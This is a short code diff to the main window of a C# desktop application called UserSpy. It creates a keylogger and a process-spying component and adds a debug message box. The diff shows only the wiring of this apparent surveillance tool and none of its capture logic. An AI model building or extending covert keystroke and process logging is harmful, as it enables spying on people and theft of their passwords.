@@ -13,9 +13,13 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 using keylogger;
+using keylogger.keylog;
 using spyprocess;
 using spyprocess.processlog;
 using spyprocess.processmodel;
+using userspyprocess;
+using System.IO;
+using System.Diagnostics;
 
 namespace UserSpy
 {    
@@ -23,13 +27,14 @@ namespace UserSpy
     {
         KeyLogger logger;
         SpyProcess SP;
-        ProcessLog PL;
+        
         public MainWindow()
         {
             logger = new KeyLogger();
             SP = new SpyProcess();
-            PL = new ProcessLog();
-            InitializeComponent();            
+            InitializeComponent();
+            MessageBox.Show($"{UserSpyProcess.GetFullPath()}");
+            
         }
     }
 }
